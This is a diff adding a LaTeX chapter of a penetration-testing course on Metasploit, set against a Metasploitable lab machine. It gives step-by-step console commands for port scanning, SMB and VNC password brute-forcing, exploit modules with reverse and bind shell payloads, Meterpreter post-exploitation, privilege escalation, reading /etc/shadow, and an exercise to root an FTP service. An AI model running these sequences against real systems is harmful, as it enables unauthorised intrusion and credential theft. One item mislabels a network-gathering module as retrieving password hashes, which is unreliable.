@@ -1,0 +1,338 @@
+\chapter{General Use of Metasploit}
+
+\section{Introduction to Penetration Testing}
+A penetration test, or \textit{pentest}, is the activity of finding vulnerabilities in computer systems. According to the Penetration Testing Execution Standard, a pentest has the following steps\cite{pentest-standard}:
+
+\begin{itemize}
+    \item Pre-engagement Interactions: defining scope and permission.
+    \item Intelligence Gathering: getting information on the target through different methods.
+    \item Threat Modeling: identifying different vulnerabilities on the target.
+    \item Vulnerability Analysis: identifying the attack method.
+    \item Exploitation: executing the attack.
+    \item Post Exploitation: getting valuable information from the target.
+    \item Reporting: the boring stuff.
+\end{itemize}
+
+\subsection{Terminology}
+
+Before we proceed, we need to define the following terms used in pentests and Metasploit:
+
+\begin{description}
+    \item[Vulnerability] it is a weakness in a computer system.
+    \item[Penetration tester] the person conducting a pentest.
+    \item[Exploit] a penetration tester uses an exploit to take advantage of a vulnerability.
+    \item[Payload] the code we want the target system to execute. A payload is included in the exploit.
+    \item[Module] a piece of software that can be used by Metasploit.
+    \item[Listener] a piece of software that waits for incoming connections.
+\end{description}
+
+\section{Metasploit Framewok}
+
+Metasploit is a framework that aims to automate many of the repetitive tasks in the previous steps. Specifically, Metasploit is mostly used in the analysis of vulnerabilities, and in the exploitation and post exploitation of vulnerabilities. In other words, Metasploit is used to validate the existence of vulnerabilities by exploiting them. The goal is to identify these vulnerabilities before somebody else does it.
+
+\subsection{Comparison with Masscan and Nmap}
+
+Let's compare Metasploit with other open-source tools: Masscan and Nmap. Masscan only focusses on Intelligence Gathering. Nmap focuses on Intelligence Gathering, with a bit of Vulnerability Analysis and Exploitation through its scripts. Metasploit focuses on Exploitation and post exploitation, with a minor emphasis on Intelligence Gathering. The following table summarizes this comparison.
+
+\begin{table}[h!]
+    \centering
+    \begin{tabular}{|l|c|c|c|} 
+        \hline
+        Pentest Standard Phase & Masscan & Nmap & Metasploit \\ [0.5ex] 
+        \hline\hline
+        Pre-engagement & & & \\
+        Intelligence Gathering & Yes & Yes & Partial \\
+        Threat Modeling & & Partial & Yes \\
+        Vulnerability Analysis &  &  & Partial \\
+        Exploitation & & Partial & Yes \\
+        Post Exploitation & & & Yes \\
+        Reporting & & & \\
+        \hline
+    \end{tabular}
+    \caption{Comparison between Masscan, Nmap, and Metasploit}
+\end{table}
+
+\subsection{Framework Components}
+Metasploit comes with a series of components, but we will only focus on two: Console and Meterpreter. While the fist is an interactive tool to access all the modules, the second is a payload generator. More generally, when we talk about Metasploit most ot the time we refer to a subproject called console. Other components worth exploring include:
+
+\begin{description}
+    \item[CLI] provides a way to access the different modules of Metasploit from the command line.
+    \item[Venom] generates the payloads.
+\end{description}
+
+\subsection{Using The Console}
+Before starting the console, it is recommended to start the \texttt{psql} server (a database), as the console will work faster:
+
+\begin{warnbox}[frametitle=Warning: Running Metasploit as root user]
+    Note that the following commands are run in a terminal as the user \textit{root}. To move from a non-root user to root type \texttt{sudo su -}
+\end{warnbox}
+
+\vspace{-1em}
+
+\mycli{\# service postgresql start \&\& msfdb init}
+
+Now, lets start the console from the command line:
+
+\mycli{\# msfconsole}
+
+Once in the console, access the help menu:
+
+\mycli{msf5 > help}
+
+\section{Intelligence Gathering}
+Information gathering can be either passive and active. Depending on the author the difference between one and the other changes. For this document, passive information gathering is any act of getting information about the target \textit{without} sending any message to the target.
+
+\subsection{Passive Intelligence Gathering}
+
+We can perform some passive intelligence gathering with the following command \texttt{whois}:
+
+\mycli{msf5 > whois <domain>|<ip\_address>}
+
+For example:
+
+\mycli{msf5 > whois www.google.com} \\
+\mycli{msf5 > whois 8.8.8.8}
+
+\subsection{Active Intelligence Gathering}
+
+\subsubsection{Portscanning}
+For active intelligence gathering, we will start with a basic port scanner, which is done by using modules. There are six important commands to use a module:
+
+\begin{enumerate}
+    \item Find the module: \\
+    \mycli{msf5 > search <string>}
+    \item Select the module: \\
+    \mycli{msf5 > use <module>}
+    \begin{tipbox}[innermargin=-25pt]
+        We can use the tab key to autocomplete the name of a module.
+    \end{tipbox}    
+    \item Display the module's options: \\
+    \mycli{msf5 > show options}
+    \item Configure a module option:\\
+    \mycli{msf5 > set <option\_name> <value>}
+    \item Execute the module, with one of two alternatives: \\
+    \mycli{msf5 > exploit} \\ or \\ \mycli{msf5 > run}
+    \item Show the hosts added to Metasploit's db or the ones identified in a scan: \\
+    \mycli{msf5 > hosts <options>}
+    \item Leave the current module: \\
+    \mycli{msf5 > back}
+\end{enumerate}
+
+Now, to actually perform the portscanning, we follow these steps:
+
+\begin{enumerate}
+    \item \mycli{msf5 > search portscan}
+    \item \mycli{msf5 > use auxiliary/scanner/portscan/syn}
+    \item \mycli{msf5 > show options}
+    \item \mycli{msf5 > set RHOSTS 10.0.2.4}
+    \begin{warnbox}[frametitle=Warning: Metasploitable IP Addess,outermargin=-25pt]
+        In this example, I we are using \texttt{10.0.2.4} as the IP address of Metasploitable. This IP address might be different in your own VM environment.
+    \end{warnbox}
+    \begin{tipbox}[outermargin=-25pt]
+        After we have a list of hosts, we can use \mycli{msf5 > hosts -R} to setup the target hosts in each module
+    \end{tipbox}
+    \item \mycli{msf5 > set PORTS 1-100}
+    \item \mycli{msf5 > run}
+    \item (optional) \mycli{msf5 > hosts}
+    \item \mycli{msf5 > back}
+\end{enumerate}
+
+Additionally, we can use \texttt{nmap} within Metasploit, for example:
+
+\mycli{msf5 > nmap -p- 10.0.2.4}
+
+\begin{infobox}[frametitle=Info: Speed Comparison]
+    This is a simple comparison of Nmap, Masscan, and Metasploit while scanning the first 100 TCP ports of \texttt{scanmen.nmap.org}:
+    \begin{itemize}
+        \item Nmap: 1.45 seconds
+        \item Masscan: 2 seconds
+        \item Nmap in Metasploit: 1.43 seconds
+        \item Metasploit: 52 seconds
+    \end{itemize}
+\end{infobox}
+
+
+\subsubsection{Targeted Scannings}
+We can test other services by performing the same approach and by changing the module to a targeted one. These modules perform additional actions than just identifying the status of a port. For example, the following modules information about different services running at the target.
+
+\begin{itemize}
+    \item Find the MySQL version:\\
+    \noindent\texttt{msf5 > use auxiliary/scanner/mysql/mysql\_version}
+    \item Find the SSH version:\\
+    \noindent\texttt{msf5 > use auxiliary/scanner/ssh/ssh\_version} \\ 
+    \begin{infobox}[innermargin=-25pt]
+        After using this command, \texttt{hosts} show a better description of our target
+    \end{infobox}
+    \item Find the FTP version:\\
+    \noindent\texttt{msf5 > use auxiliary/scanner/ftp/ftp\_version}
+    \item Find the SMB version:\\
+    \noindent\texttt{msf5 > use auxiliary/scanner/smb/smb\_version}
+    \item Find the telnet version:\\
+    \noindent\texttt{msf5 > use auxiliary/scanner/telnet/telnet\_version}
+\end{itemize}
+
+\section{Vulnerability Scanning}
+
+Vulnerability scanners interact with the target in order to detect weaknesses. For example, they might try to login with default credentials; or based on the response, determine the version and patches applied to a service.
+
+Even though Metasploit can work with Nexpose and Nessus, we will focus on single-service vulnerability scanners.
+
+\begin{itemize}
+    \item Validating SMB logins (bruteforce):\\
+    \mycli{msf5 > use auxiliary/scanner/smb/smb\_login} \\ 
+    \begin{warnbox}[outermargin=-25pt]
+        For this module, we need to setup a list of username and passwords. Check this module's options. Multiple wordlists including usernames and passwords can be found in the folder \path{/usr/share/wordlists}.
+    \end{warnbox}
+    \item Open VNC authentication:\\
+    \mycli{msf5 > auxiliary/scanner/vnc/vnc\_none\_auth}
+    \item Open X11 Servers:\\
+    \mycli{msf5 > auxiliary/scanner/x11/open\_x11}
+\end{itemize}
+
+Using auxiliary modules we can bruteforce passwords:
+
+\begin{itemize}
+    \item Bruteforce root's password with VNC:\\
+    \mycli{msf5 > auxiliary/scanner/vnc/vnc\_login} \\
+    \mycli{msf5 > set USERNAME root} \\
+    \mycli{msf5 > hosts -R} \\
+    \mycli{msf5 > run}
+\end{itemize}
+
+\begin{tipbox}[frametitle=Tip: Displaying all auxiliary modules]
+    To see the whole list of auxiliary modules use: \\
+    \mycli{msf5 > show auxiliary}
+\end{tipbox}
+
+\section{Exploitation}
+
+Metasploit helps us to take advantage of vulnerabilities with different exploitation modules. To see the list of exploitation modules type: 
+
+\mycli{msf5 > show exploits}
+
+In the exploitation phase is where \texttt{msf5 > search} becomes helpful, as we can search for any string such as service name, service achronym, CVE, MS security bulletin, or fancy vulnerability name (like bluekeep, eternalblue, or proxylogon).
+
+After finding the right exploit module, the steps to use the module are the same we used for any other module, with the exception that before running the module we might need to check different configurations to decide on the IP of the target, ports, the type of target, and the payload. For example:
+
+\begin{enumerate}
+    \item \texttt{msf5 > use exploit/linux/postgresql/postgresql\_payload}
+    \item \texttt{msf5 > show payloads} \\
+    \begin{infobox}[innermargin=-25pt]
+        \texttt{show payloads} shows only the payloads applicable to the selected module.
+    \end{infobox}
+    \item \texttt{msf5 > set payload linux/x86/shell\_reverse\_tcp}
+    \item \texttt{msf5 > show options}
+    \item \texttt{msf5 > set RHOST 10.0.2.4}
+    \begin{infobox}[innermargin=-25pt]
+        The next IP is the IP where the target will try to connect, so it has to be an IP we control and reachable by the target. 
+    \end{infobox}
+    \item \texttt{msf5 > set LHOST 10.0.2.15}
+    \item \texttt{msf5 > show targets}
+    \item \texttt{msf5 > set TARGET 0}
+    \item \texttt{msf5 > run}
+\end{enumerate}
+
+\begin{tipbox}[frametitle=Tip: Getting Interactive Shell]
+    After getting a basic shell, you can get an interactive shell with: \\
+    \mycli{python -c \textquotesingle import pty; pty.spawn("/bin/bash")\textquotesingle}
+\end{tipbox}
+
+Another example:
+
+\begin{enumerate}
+    \item \texttt{msf5 > use exploit/unix/misc/distcc\_exec}
+    \item \texttt{msf5 > show payloads}
+    \item \texttt{msf5 > set payload cmd/unix/bind\_perl}
+    \item \texttt{msf5 > show options}
+    \item \texttt{msf5 > host -r}
+    \item \texttt{msf5 > run}
+\end{enumerate}
+
+\section{Post Exploitation}
+Metasploit's payload determines the type of access that we have after exploiting the target. In general, there are three types:
+
+\begin{itemize}
+    \item Portbind: it opens a port in the target and then we can connect to such port. This is generally prevented by firewalls at the target. Generally, we obtain shell access (a.k.a. command line access) after connecting to the target port.
+    \item Reverse shell: it open a port in our attacking system, then the target connects to our system. Generally we obtain shell access.
+    \item Meterpreter: it opens a port in our attacking system, then the target connects to our system. In this case we do not obtain shell access, we obtain a Meterpreter session, which includes additional commands.
+\end{itemize}
+
+\subsection{Meterpreter}
+
+To obtain a Meterpreter session in the target, we can use the following commands:
+\begin{enumerate}
+    \item \texttt{msf5 > use exploit/linux/postgresql/postgresql\_payload}
+    \item \texttt{msf5 > set payload linux/x86/meterpreter/bind\_tcp}
+    \item \texttt{msf5 > set RHOST 10.0.2.4}
+    \item \texttt{msf5 > run}
+\end{enumerate}
+
+Some of the most common commands that Meterpreter has are:
+
+\begin{itemize}
+    \item List of commands:\\
+    \texttt{meterpreter > help}
+    \item Obtain shell:\\
+    \texttt{meterpreter > shell}
+    \item Get user info: \\
+    \texttt{meterpreter > getuid}
+    \item Get system info:\\
+    \texttt{meterpreter > sysinfo}
+\end{itemize}
+
+Additionally, Meterpreter has scripts. The list of available scripts depends on the target. For our setup, we some of the available scripts are:
+
+\begin{itemize}
+    \item Check if the target is a virtual machine:\\
+    \texttt{run post/linux/gather/checkvm}
+    \item Get network configuration:\\
+    \texttt{run post/linux/gather/enum\_network}
+    \item Get possible local exploits\\
+    \texttt{run post/multi/recon/local\_exploit\_suggester}
+\end{itemize}
+
+\subsection{Getting Admin Access}
+
+Once we obtained a session, we can execute some of the local exploits suggested by the previous script:
+
+\begin{itemize}
+    \item\texttt{meterpreter > background} (This will show a session name)
+    \item\texttt{msf5 > use exploit/linux/local/glibc\_ld\_audit\_dso\_load\_priv\_esc}
+    \begin{infobox}
+        The next session is the one we obtained by issuing \texttt{meterpreter > background} 
+    \end{infobox}
+    \item\texttt{msf5 > set session 3}
+    \begin{warnbox}
+        The exploit \texttt{glibc\_ld\_audit\_dso\_load\_priv\_esc} is configured by default to run a meterpreter reverse tcp but for x64 architecture.
+    \end{warnbox}    
+
+    \item \texttt{msf5 > set payload linux/x86/meterpreter/reverse\_tcp}
+    \item\texttt{msf5 > run}
+\end{itemize}
+
+After we obtain root privileges, we can run more scripts, for example:
+
+\begin{itemize}
+    \item Get the password hashes:\\
+    \texttt{meterpreter > run post/linux/gather/enum\_network}
+\end{itemize}
+
+We can additionally show the content of files: 
+
+\begin{itemize}
+    \item Get the password hashes:\\
+    \texttt{meterpreter > cat /etc/shadow}
+\end{itemize}
+
+\section{Exercise}
+
+We know there is an FTP service running on port 21 at our target. Exploit this service using Metasploit.
+
+\begin{enumerate}
+    \item Find the program name and version.
+    \item Find an exploit.
+    \item Configure the exploit.
+    \item Execute the exploit.
+    \item Identify the user that is running the program.
+    \item Get root.
+\end{enumerate}
